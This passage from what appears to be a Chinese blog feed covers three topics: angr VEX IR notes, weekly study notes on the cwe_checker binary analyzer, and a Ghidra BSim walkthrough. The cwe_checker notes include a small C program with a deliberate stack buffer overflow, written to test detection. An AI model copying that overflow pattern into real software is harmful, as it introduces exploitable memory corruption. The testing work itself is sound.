<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Standard integer comparisons */</span><br><span class="line">Iop_CmpLT32S, Iop_CmpLT64S,</span><br><span class="line">Iop_CmpLE32S, Iop_CmpLE64S,</span><br><span class="line">Iop_CmpLT32U, Iop_CmpLT64U,</span><br><span class="line">Iop_CmpLE32U, Iop_CmpLE64U,</span><br></pre></td></tr></table></figure>
<p>该结果为在x86汇编中为指令jge服务（大于等于则跳转）<br>
所以小于3时t8=t20=t16=1<br>
因此cmpLT应该是“前小于后返回1”<br>
所以&quot;CmpL*&quot;是只能比较小于或等于？</p>
<p><em>注：试了一下还真是这样的，形成的中间代码会把其他判断方式转换成&quot;&lt;“/”=&quot;</em><br>
<em>注2：在微软的文档搜到了SSE2指令集，里边的比较指令和 vex ir 长得还蛮像的↓</em><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210516225639.png" alt="20210516225639"></p>
<h2 id="来个aarch64的">来个aarch64的</h2>
<p>用aarch64-linux-gnu-gcc编译了相同的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">int</span>* b;</span><br><span class="line">&#125;aa;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">double</span> b=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">switch</span>(a)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a=2&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a=1&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a==null&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;aa.a);</span><br><span class="line">	aa.b = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (aa.a ==a)</span><br><span class="line">		aa.b[<span class="number">1</span>] = aa.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用angr加载的时候会产生警告，但（对于这个样例）没有影响<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510184101.png" alt="20210510184101"><br>
<em>注：上一个应该是因为找不到动态链接库，编译选项设置静态编译后可以正常加载</em></p>
<p>发现vex ir用到的寄存器是根据程序cpu架构改变的。如i386、amd64下用到PUT(rip)、PUT(eip)，在aarch64下则是PUT(pc)</p>
<p>选取下面这句代码的中间代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(qword_4999C8 + <span class="number">4</span>) = aa;</span><br></pre></td></tr></table></figure>
<h3 id="aarch64">aarch64</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510213959.png" alt="20210510213959"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   00 | ------ IMark(0x400778, 4, 0) ------</span><br><span class="line">   01 | ------ IMark(0x40077c, 4, 0) ------</span><br><span class="line">   02 | PUT(pc) = 0x0000000000400780</span><br><span class="line">   03 | ------ IMark(0x400780, 4, 0) ------</span><br><span class="line">   04 | t4 = LDle:I64(0x00000000004999c8)</span><br><span class="line">   05 | ------ IMark(0x400784, 4, 0) ------</span><br><span class="line">   06 | t7 = Add64(t4,0x0000000000000004)</span><br><span class="line">   07 | ------ IMark(0x400788, 4, 0) ------</span><br><span class="line">   08 | ------ IMark(0x40078c, 4, 0) ------</span><br><span class="line">   09 | PUT(pc) = 0x0000000000400790</span><br><span class="line">   10 | ------ IMark(0x400790, 4, 0) ------</span><br><span class="line">   11 | t34 = LDle:I32(0x00000000004999c0)</span><br><span class="line">   12 | t57 = 32Uto64(t34)</span><br><span class="line">   13 | t33 = t57</span><br><span class="line">   14 | PUT(pc) = 0x0000000000400794</span><br><span class="line">   15 | ------ IMark(0x400794, 4, 0) ------</span><br><span class="line">   16 | t58 = 64to32(t33)</span><br><span class="line">   17 | t37 = t58</span><br><span class="line">   18 | STle(t7) = t37</span><br><span class="line">   19 | ------ IMark(0x400798, 4, 0) ------</span><br><span class="line">   20 | ------ IMark(0x40079c, 4, 0) ------</span><br><span class="line">   21 | PUT(x1) = 0x0000000000000000</span><br><span class="line">   22 | ------ IMark(0x4007a0, 4, 0) ------</span><br><span class="line">   23 | PUT(pc) = 0x00000000004007a4</span><br><span class="line">   24 | ------ IMark(0x4007a4, 4, 0) ------</span><br><span class="line">   25 | t19 = LDle:I64(0x0000000000497f50)</span><br><span class="line">   26 | PUT(x0) = t19</span><br><span class="line">   27 | PUT(pc) = 0x00000000004007a8</span><br><span class="line">   28 | ------ IMark(0x4007a8, 4, 0) ------</span><br><span class="line">   29 | t46 = GET:I64(xsp)</span><br><span class="line">   30 | t45 = Add64(t46,0x0000000000000028)</span><br><span class="line">   31 | t21 = LDle:I64(t45)</span><br><span class="line">   32 | PUT(pc) = 0x00000000004007ac</span><br><span class="line">   33 | ------ IMark(0x4007ac, 4, 0) ------</span><br><span class="line">   34 | t23 = LDle:I64(t19)</span><br><span class="line">   35 | ------ IMark(0x4007b0, 4, 0) ------</span><br><span class="line">   36 | t27 = Sub64(t21,t23)</span><br><span class="line">   37 | PUT(x2) = t27</span><br><span class="line">   38 | PUT(cc_op) = 0x0000000000000004</span><br><span class="line">   39 | PUT(cc_dep1) = t21</span><br><span class="line">   40 | PUT(cc_dep2) = t23</span><br><span class="line">   41 | PUT(cc_ndep) = 0x0000000000000000</span><br><span class="line">   42 | ------ IMark(0x4007b4, 4, 0) ------</span><br><span class="line">   43 | PUT(x3) = 0x0000000000000000</span><br><span class="line">   44 | PUT(pc) = 0x00000000004007b8</span><br><span class="line">   45 | ------ IMark(0x4007b8, 4, 0) ------</span><br><span class="line">   46 | t60 = CmpEQ64(t21,t23)</span><br><span class="line">   47 | t59 = 1Uto64(t60)</span><br><span class="line">   48 | t55 = t59</span><br><span class="line">   49 | t61 = 64to1(t55)</span><br><span class="line">   50 | t49 = t61</span><br><span class="line">   51 | if (t49) &#123; PUT(pc) = 0x4007c0; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(pc) = 0x00000000004007bc; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="amd64">amd64</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510213751.png" alt="20210510213751"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   00 | ------ IMark(0x40126d, 7, 0) ------</span><br><span class="line">   01 | t9 = LDle:I64(0x0000000000404028)</span><br><span class="line">   02 | ------ IMark(0x401274, 4, 0) ------</span><br><span class="line">   03 | t10 = Add64(t9,0x0000000000000004)</span><br><span class="line">   04 | PUT(rdx) = t10</span><br><span class="line">   05 | PUT(rip) = 0x0000000000401278</span><br><span class="line">   06 | ------ IMark(0x401278, 6, 0) ------</span><br><span class="line">   07 | t13 = LDle:I32(0x0000000000404020)</span><br><span class="line">   08 | t29 = 32Uto64(t13)</span><br><span class="line">   09 | t12 = t29</span><br><span class="line">   10 | PUT(rip) = 0x000000000040127e</span><br><span class="line">   11 | ------ IMark(0x40127e, 2, 0) ------</span><br><span class="line">   12 | t30 = 64to32(t12)</span><br><span class="line">   13 | t14 = t30</span><br><span class="line">   14 | STle(t10) = t14</span><br><span class="line">   15 | ------ IMark(0x401280, 5, 0) ------</span><br><span class="line">   16 | PUT(rax) = 0x0000000000000000</span><br><span class="line">   17 | PUT(rip) = 0x0000000000401285</span><br><span class="line">   18 | ------ IMark(0x401285, 4, 0) ------</span><br><span class="line">   19 | t18 = GET:I64(rbp)</span><br><span class="line">   20 | t17 = Add64(t18,0xfffffffffffffff8)</span><br><span class="line">   21 | t19 = LDle:I64(t17)</span><br><span class="line">   22 | PUT(rip) = 0x0000000000401289</span><br><span class="line">   23 | ------ IMark(0x401289, 9, 0) ------</span><br><span class="line">   24 | t21 = GET:I64(fs)</span><br><span class="line">   25 | t20 = Add64(0x0000000000000028,t21)</span><br><span class="line">   26 | t6 = LDle:I64(t20)</span><br><span class="line">   27 | t5 = Xor64(t19,t6)</span><br><span class="line">   28 | PUT(cc_op) = 0x0000000000000014</span><br><span class="line">   29 | PUT(cc_dep1) = t5</span><br><span class="line">   30 | PUT(cc_dep2) = 0x0000000000000000</span><br><span class="line">   31 | PUT(rcx) = t5</span><br><span class="line">   32 | PUT(rip) = 0x0000000000401292</span><br><span class="line">   33 | ------ IMark(0x401292, 2, 0) ------</span><br><span class="line">   34 | t32 = CmpEQ64(t5,0x0000000000000000)</span><br><span class="line">   35 | t31 = 1Uto64(t32)</span><br><span class="line">   36 | t27 = t31</span><br><span class="line">   37 | t33 = 64to1(t27)</span><br><span class="line">   38 | t22 = t33</span><br><span class="line">   39 | if (t22) &#123; PUT(rip) = 0x401299; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(rip) = 0x0000000000401294; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>课题</tag>
      </tags>
  </entry>
  <entry>
    <title>CWE_Checker笔记</title>
    <url>/23546.html</url>
    <content><![CDATA[<p>看 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2Vy">https://github.com/fkie-cad/cwe_checker<i class="fa fa-external-link-alt"></i></span> 的一些记录，目标是fix一个bug</p>
<span id="more"></span>
<h1>Week1</h1>
<ul>
<li>一个typo的PR（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL3B1bGwvMzg3">#387<i class="fa fa-external-link-alt"></i></span>）</li>
<li>搭remote debug（source code）</li>
<li>学Rust，到Rust Course的2.6：模式匹配</li>
<li>看博客、讨论：<br>
<span class="exturl" data-url="aHR0cHM6Ly9jYXNjYWRlcy1zanR1LmdpdGh1Yi5pby9wb3N0cy9jd2UtY2hla2Nlci8=">https://cascades-sjtu.github.io/posts/cwe-chekcer/<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2Rpc2N1c3Npb25zLzI5Ng==">What is the logic of discovering cwe?<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2Rpc2N1c3Npb25zLzIwOA==">Questions about internal mechanism of cwe_checker<i class="fa fa-external-link-alt"></i></span></li>
<li>了解项目结构</li>
<li>看文档
<ul>
<li>CWE119 Buffer Overflow:<br>
误报：1.指针推断（Pointer Inference）过程不准确；2.不确定边界大小时，会以找到的最小边界为准<br>
漏报：1.指针推断无法确定任何边界；2.指针推断只能检测到溢出整个栈帧的情况，例如off-by-one就检测不出；3.函数调用时被调用函数缓冲区大小不确定；4.Checker本身无法识别全局内存的溢出</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20230210164343.png" alt="20230210164343"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cwe_checker</span><br><span class="line">├─ bare_metal # 裸机程序分析的config样例</span><br><span class="line">├─ cwe_checker_to_ida # 把分析结果生成ida anotation script</span><br><span class="line">├─ ghidra_plugin # 把分析结果（--json）生成ghidra可用的文件</span><br><span class="line">├─ src</span><br><span class="line">│  ├─ caller</span><br><span class="line">│  │  └─ src # cwe_checker主函数</span><br><span class="line">|  |         # 包括接收cmd参数、读取文件、调用lib.rs里的各个分析模块</span><br><span class="line">│  ├─ cwe_checker_lib</span><br><span class="line">│  │  └─ src</span><br><span class="line">│  │     ├─ abstract_domain</span><br><span class="line">│  │     ├─ analysis</span><br><span class="line">│  |     ├─ checkers # 所有CWE的check代码，</span><br><span class="line">|  |     |             大部分是调用analysis目录下的方法</span><br><span class="line">│  |     ├─ intermediate_representation</span><br><span class="line">│  |     ├─ lib.rs</span><br><span class="line">│  |     ├─ checkers.rs</span><br><span class="line">│  |     ├─ pcode</span><br><span class="line">│  |     ├─ pipeline</span><br><span class="line">│  |     └─ utils</span><br><span class="line">│  ├─ ghidra</span><br><span class="line">│  │  └─ src # 在lib里被调用，提取ghidra分析结果，</span><br><span class="line">|  |           包括变量、跳转关系等信息，以pcode表示</span><br><span class="line">│  └─ installer</span><br><span class="line">│     └─ src # 用于本地安装cwe_checker</span><br><span class="line">└─ test # cwe对应漏洞源码样本以及test build脚本</span><br></pre></td></tr></table></figure>
<h1>Week2</h1>
<p>上周最后那张图里的问题：<br>
CWE-119、CWE-125、CWE-787: 都属于缓冲区溢出，119-缓冲区边界内操作的限制不恰当，125-越界读，787-越界写</p>
<p>看 <span class="exturl" data-url="aHR0cDovL21haW4ucnM=">main.rs<i class="fa fa-external-link-alt"></i></span>、构建CFG、检查cwe_676及cwe-467的过程</p>
<ul>
<li>check过程：</li>
</ul>
<ol>
<li>从ghidra中提取反编译的信息（在/pipeline/里实现）</li>
<li>生成控制流图</li>
<li>部分CWE的检测需要进行计算函数签名、指针推理、字符串抽象</li>
<li>依次执行每个CWE检测模块</li>
</ol>
<ul>
<li>cwe_676（使用不安全函数）检测过程：</li>
</ul>
<ol>
<li>把调用到的库函数和配置文件里标注的危险函数进行对比，得到dangerous symbol</li>
<li>找到所有调用危险函数的用户函数，以及它们发起调用的地址</li>
</ol>
<ul>
<li>
<p>生成控制流图：<br>
4步(TODO)，看了第一步</p>
</li>
<li>
<p>cwe-476（空指针解引用）：<br>
污点分析(TODO)</p>
</li>
</ul>
<p>Found some issues:<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2lzc3Vlcy8zMDM=">What’s the meaning of subs?<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2lzc3Vlcy8zMDQ=">Why a certain block is both start and end?<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2lzc3Vlcy8zMDU=">What’s the meaning of block.term.jmps?<i class="fa fa-external-link-alt"></i></span>（the meaning of ‘tid’)<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2lzc3Vlcy8zMDk=">What is the logic to check CWE476(NULL Pointer Dereference)?<i class="fa fa-external-link-alt"></i></span><br>
(Mine ask) <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2lzc3Vlcy8zOTA=">Some comments seems confusing<i class="fa fa-external-link-alt"></i></span></p>
<h1>Week3</h1>
<p>Overall：CFG<br>
字符串抽象（默认不用）&lt;-指针推理&lt;-函数签名<br>
三个过程的含义，每一个过程的输出<br>
CWE676：</p>
<p>只用了project.term.subs，即子函数，<br>
并非基于函数进行搜索</p>
<p>cwe119和函数签名计算都要先进行不动点计算</p>
<p>提取ghidra信息时一开始sub向量中的每一个.[].term.block不是对应基本块，粒度更细</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/CWE-Checker-Week-3&amp;4.png" alt="CWE-Checker-Week-3&amp;4"></p>
<h1>Week5</h1>
<p>南大《软件分析》的数据流分析和过程间分析（部分）</p>
<p>One issue: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZraWUtY2FkL2N3ZV9jaGVja2VyL2lzc3Vlcy8zOTU=">https://github.com/fkie-cad/cwe_checker/issues/395<i class="fa fa-external-link-alt"></i></span><br>
CWE-125&amp;787分别准确地指越界读和越界写；剩下不确定是读还是写越界的统统报CWE119<br>
CWE-119的checker的下一步进展：跟踪值之间的关系，以及哪些值和缓冲区大小有关<br>
在free()误报CWE119的场景基本上是由于误认为释放的堆大小为0<br>
CWE119目前只能判断出编译时规定的内存分配大小，对运行时才知道分配大小的情况不会告警</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20230310163355.png" alt="20230310163355"><br>
分析的主要部分其实在Computation部分，包括过程内和过程间的分析</p>
<h1>Week6</h1>
<p>检测b00k时，检测到’free(0)'的过程:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">compute_with_max_steps()执行worklist算法，循环，结点运行次数超过max_step（<span class="number">100</span>）则放到not_stable_list里作为新的worklist</span><br><span class="line">    -&gt;fixpoint.rs -- update_node()，获得结点连接的所有边并迭代update_edge()，</span><br><span class="line">        -&gt;fixpoint.rs -- update_edge()，获得edge连接的两个node</span><br><span class="line">            -&gt;forward_interprocedural_fixpoint.rs -- update_edge()，迭代，更新edge终点的值（？），</span><br><span class="line">            从edge的权值判断edge是属于什么类型的（jmp、call、....如下图）</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                block分支-&gt;trait_impls.rs -- update_def()，判断语句是load/store/变量声明，以及是否溢出   </span></span><br><span class="line"><span class="comment">                    （store和load分支）-&gt;state.rs() -- check_address_access，CWE125和787都会进行</span></span><br><span class="line"><span class="comment">                        -&gt; ....</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                ExternCallStub分支-&gt;trait_impls.rs -- update_call_stub()，根据call.term的结构进行跳转。</span><br><span class="line">                    直接跳转（Call）分支-&gt;stubs.rs -- handle_call()，匹配被调用的函数名</span><br><span class="line">                        不属于列举的那些函数-&gt; stub.rs -- handle_generic_call()，取每一个传参的寄存器进行遍历</span><br><span class="line">                            -&gt;mod.rs -- check_param_at_call()，在发起调用的地方是否产生了越界</span><br><span class="line">                                -&gt;vsa_result_impl.rs -- eval_parameter_arg_at_call()，取state和context，调用↓</span><br><span class="line">                                    -&gt;access_handling.rs -- eval_parameter_arg()，根据parameter参数的结构（寄存器或栈）进行匹配</span><br><span class="line">                                        -&gt;access_handling.rs -- eval，获得eval_recursive()的结果()，执行replace_if_global_pointer()</span><br><span class="line">                                            -&gt;access_handling.rs -- eval_recursive()，对参数进行匹配，递归计算当前状态下表达式的值。</span><br><span class="line">                                                已知大小的寄存器或变量-&gt;access_handling.rs -- get_register()  <span class="comment">/*一些处理*/</span></span><br><span class="line">                                            -&gt;access_handling -- replace_if_global_pointer()，<span class="built_in">free</span>()不经过，没有细看</span><br><span class="line">                            -&gt;state.rs -- check_address_access()，</span><br><span class="line">                                遍历address.relative_values，如果未计算该堆栈的边界-&gt;state.rs -- compute_bounds_of_id()</span><br><span class="line">                                -&gt;bounds_computation.rs -- compute_bounds_of_id()，通过调用的地址判断在堆还是栈上</span><br><span class="line">                                    堆-&gt;mod.rs -- compute_size_of_heap_object()，计算创建堆的大小，如果有多个可能的值则返回最小值</span><br><span class="line">                                        -&gt;param_replacement.rs -- recursively_substitute_param_values_context_sensitive()，</span><br><span class="line">                                        在检测 <span class="built_in">free</span>()的时候直接返回了object_size，</span><br><span class="line">                                        相当于pointer inference 分析出的 malloc_tid_to_object_size_map</span><br><span class="line">                                            -&gt;param_replacement.rs -- recursively_substitute_param_values()</span><br><span class="line">                                                中间有个循环，但是没有进去</span><br><span class="line">                                                -&gt;data.rs -- replace_all_ids()，更新结点，准备下一轮循环，这边也跳过了</span><br><span class="line">                                        -&gt;mod.rs -- try_to_offset_interval()，把从address.relative_values（堆/栈起始和结束地址的</span><br><span class="line">                                        偏移位置等）得到的offset.interval转成<span class="number">64</span>位数据，赋值给lower_offset，upper_offset</span><br><span class="line">                                        -&gt;bitvector.rs -- into_resize_signed()，把两个bound扩展/截断，位数为object_size.size</span><br><span class="line">                                        -&gt;bounds_computation.rs -- compute_bounds_of_param_id()，返回<span class="literal">NULL</span></span><br><span class="line">                                    函数在此处给lower_bound和upper_bound返回了<span class="literal">NULL</span></span><br><span class="line">                                    -&gt;bounds_computation.rs -- object_size.try_to_offset()，把object_size变成<span class="number">0</span></span><br><span class="line">                                    运行了一些无关的循环（<span class="function"><span class="keyword">if</span> let <span class="title">Some</span><span class="params">()</span>匹配不成功），返回lower_bound和upper_bound均为<span class="literal">NULL</span>，</span></span><br><span class="line"><span class="function">                                    （函数起始有一段注释&quot;where the bounds may be `None` <span class="keyword">if</span> they could <span class="keyword">not</span> be determined&quot;）</span></span><br><span class="line"><span class="function">                                    通过<span class="title">into_resize_signed</span><span class="params">()</span>比较lower_bound、upper_bound和位数（8字节）把两个bound的</span></span><br><span class="line"><span class="function">                                    len重新设为64，指针还是<span class="literal">NULL</span>，并插入self.object_lower_bounds</span></span><br><span class="line"><span class="function">                                判断（upper_bound &lt; upper_offset + <span class="params">(u64::from(value_size) as i64）为真，记录溢出，输出越界访问的警告</span></span></span><br><span class="line"><span class="params"><span class="function">            merge_node_value()，准备检查后续结点</span></span></span><br><span class="line"><span class="params"><span class="function">执行完所有checker后统一输出warning</span></span></span><br></pre></td></tr></table></figure>
<p>在最后检查是否溢出时，value_size是固定的； ~<s>upper_offset来自pointer inference</s>~ ；upper_bound在compute_size_of_heap_object()返回了NULL，因此可能是该函数执行的过程中有问题</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">enum</span> <span class="title">Edge</span></span>&lt;<span class="symbol">&#x27;a</span>&gt; &#123;</span><br><span class="line">    <span class="comment">//Block边，从start指向end</span></span><br><span class="line">    <span class="comment">//用户定义的jmp和call</span></span><br><span class="line">    <span class="comment">//外部函数跳转，用ExternCallStub直接略过</span></span><br><span class="line">    Block,</span><br><span class="line">    Jump(&amp;<span class="symbol">&#x27;a</span> Term&lt;Jmp&gt;, <span class="built_in">Option</span>&lt;&amp;<span class="symbol">&#x27;a</span> Term&lt;Jmp&gt;&gt;),</span><br><span class="line">    Call(&amp;<span class="symbol">&#x27;a</span> Term&lt;Jmp&gt;),</span><br><span class="line">    ExternCallStub(&amp;<span class="symbol">&#x27;a</span> Term&lt;Jmp&gt;),</span><br><span class="line">    <span class="comment">//在call某个函数的过程中，对应为：</span></span><br><span class="line">    <span class="comment">//虚拟的CallSource块指向虚拟的CallReturn块；</span></span><br><span class="line">    <span class="comment">//从子函数的Blkend指向虚拟的CallReturn块；</span></span><br><span class="line">    <span class="comment">//从发出跳转的Blkend指向虚拟的CallSource块；</span></span><br><span class="line">    <span class="comment">//从虚拟的CallReturn块指向后续的BlkStart块；</span></span><br><span class="line">    CrCallStub,</span><br><span class="line">    CrReturnStub,</span><br><span class="line">    CallCombine(&amp;<span class="symbol">&#x27;a</span> Term&lt;Jmp&gt;),</span><br><span class="line">    ReturnCombine(&amp;<span class="symbol">&#x27;a</span> Term&lt;Jmp&gt;),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://fkie-cad.github.io/cwe_checker/doc/images/internal_function_call.png" alt="internal_function_call"><br>
<img src="https://fkie-cad.github.io/cwe_checker/doc/images/extern_calls.png" alt="extern_calls"><br>
<img src="https://fkie-cad.github.io/cwe_checker/doc/images/node_edge.png" alt="node_edge"></p>
<p>Hitcon Traning Lab13的heapcreator（off-by-one）啥都没报<br>
写了一个简单的栈溢出也没有任何告警</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">14</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c\n&quot;</span>,&amp;a[i]);</span><br><span class="line">		<span class="built_in">puts</span>(a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>binabsinspector对几个文件的分析结果，第一个和最后一个对了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b00k：</span><br><span class="line">BinAbsInspector.java&gt; [WARN] CWE190: Potential Integer Overflow due to tainted input from source of __isoc99_scanf(FUN_00100f55[0, 0, 10127f]) at inside of &quot;FUN_00100f55()&quot; @ 001010a6</span><br><span class="line">BinAbsInspector.java&gt; [WARN] CWE190: Potential Integer Overflow due to tainted input from source of __isoc99_scanf(FUN_00100a89[0, 0, 101240]) at inside of &quot;main()&quot; @ 00101259</span><br><span class="line">BinAbsInspector.java&gt; [WARN] CWE190: Potential Integer Overflow due to tainted input from source of __isoc99_scanf(FUN_00100a89[0, 0, 101240]) at inside of &quot;main()&quot; @ 00101268</span><br><span class="line">BinAbsInspector.java&gt; [WARN] CWE190: Potential Integer Overflow due to tainted input from source of __isoc99_scanf(FUN_00100f55[0, 0, 10127f]) at inside of &quot;FUN_00100f55()&quot; @ 00100fec</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Ghidra-BSim测试</title>
    <url>/9865.html</url>
    <content><![CDATA[<h1>介绍</h1>
<h1>使用过程</h1>
<h2 id="GUI">GUI</h2>
<p>创建一个non-shared项目，打开BSim功能（v11.0 默认关闭）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/master/20231230131132.png" alt="1"><br>
执行CreateH2BSimDatabaseScript.java脚本，修改name和dir字段，其他不修改。<br>
分析一个二进制文件<br>
执行AddProgramToH2BSimDatabaseScript.java脚本，使用name.mv.db数据库。脚本执行后会把这个二进制文件的函数签名加入数据库中<br>
在BSim的菜单栏里选择Manage Servers指定database<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20231230140608.png" alt="20231230140608"><br>
把当前code view窗口选定的函数和database里的进行匹配，可以设置相似阈值和置信度阈值，也可以指定条件（二进制文件名、架构、调用了xx外部函数）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20231230142324.png" alt="20231230142324"><br>
得到结果<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20231230181838.png" alt="20231230181838"><br>
比对的结果默认包含整个database里的函数，因此也包含了该二进制文件里的函数<br>
可以对匹配到的函数名字进行替换、比对伪代码和汇编代码<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20231230183247.png" alt="20231230183247"></p>
<p>在code browser里选择bsim-&gt;code overview，选择多行进行search可以在一个result窗口查看多个函数的匹配结果<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103190919.png" alt="20240103190919"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103190936.png" alt="20240103190936"></p>
<h2 id="CLI">CLI</h2>
<p>TO BE CONTINUED …</p>
<h1>提供的脚本</h1>
<p><em>可以从这些脚本（部分）去看BSim的相似度、置信度的计算规则</em></p>
<h2 id="JAVA">JAVA</h2>
<ul>
<li>AddProgramToH2BSimDatabaseScript.java：生成当前二进制文件所有函数的BSim信息并保存到数据库</li>
<li>CompareBSimSignaturesScript.java：对两个待测的函数各跑一遍（两个函数可以在不同文件），输出BSim对这两个函数的比较结果</li>
<li>CompareBSimSignaturesSpecifyWeightsScript.java：基本同上</li>
<li>CompareExecutablesScript.java：由两个二进制文件所有的函数相似得分，得到两个二进制的得分（实际上是把二进制文件放到数据库里进行比对，<em>需要再看一下如何选取函数进行比较，因为GUI比较里好像无法得到1对1的结果</em>）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103194149.png" alt="20240103194149"></li>
<li>CreateH2BSimDatabaseScript.java：创建数据库</li>
<li>DumpBSimSignaturesScript.java：导出选定函数的函数特征哈希，每条汇编有一个哈希<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103195804.png" alt="20240103195804"></li>
<li>ExampleOverviewQueryScript.java：GUI的Overview功能</li>
<li>ExampleQueryClientScript.java：查询特定函数的“一些信息”（&lt;/responseinfo&gt;之前都相同，后续打印了callee函数）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103202052.png" alt="20240103202052"></li>
<li>GenerateSignatures.java：生成签名</li>
<li>LocalBSimQueryScript.java：在database里选一个二进制和当前的二进制进行函数比对<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103201611.png" alt="20240103201611"></li>
<li>QueryFunction.java：GUI里的search功能</li>
<li>QueryWithFiltersScript.java：基本同上</li>
<li>UpdateBSimMetadata.java：更新数据库</li>
</ul>
<h2 id="Python">Python</h2>
<ul>
